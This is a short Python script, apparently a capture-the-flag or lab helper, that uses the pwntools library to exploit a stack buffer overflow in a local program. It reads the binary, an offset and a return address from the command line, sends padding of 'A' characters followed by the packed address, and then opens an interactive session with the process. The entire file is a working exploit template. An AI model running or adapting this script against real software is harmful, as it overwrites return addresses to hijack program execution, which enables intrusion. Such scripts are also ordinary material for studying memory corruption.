import sys
from pwn import *

argument = sys.argv[1:]

file = argument[0]
offset = int(argument[1])
address = int(argument[2], 16)

print(file)

p = process(file)
payload = b"A" * offset + p32(address)
p.recvuntil(b"Please enter your string: \n")    
p.sendline(payload)
p.interactive()